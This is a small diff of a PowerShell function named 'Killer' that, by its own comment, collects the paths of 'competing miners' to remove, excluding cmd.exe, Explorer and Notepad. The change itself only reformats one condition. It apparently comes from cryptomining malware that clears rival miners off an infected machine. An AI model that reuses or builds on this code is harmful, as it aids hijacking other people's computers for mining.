@@ -52,8 +52,7 @@ Function Killer
 			
 			# Create an array of competing miners' paths to remove
 			$Path = $($m.Path)
-			if ($Path -eq "$Env:WinDir\System32\cmd.exe" -Or $Path -eq "$Env:WinDir\SysWOW64\cmd.exe" -Or $Path -eq "$Env:WinDir\Explorer.exe" 
-			-Or $Path -eq "$Env:WinDir\Notepad.exe") { continue }
+			if ($Path -eq "$Env:WinDir\System32\cmd.exe" -Or $Path -eq "$Env:WinDir\SysWOW64\cmd.exe" -Or $Path -eq "$Env:WinDir\Explorer.exe" -Or $Path -eq "$Env:WinDir\Notepad.exe") { continue }
 			if ($PathArray -NotContains $Path) { $PathArray+=$Path }
 		}
 
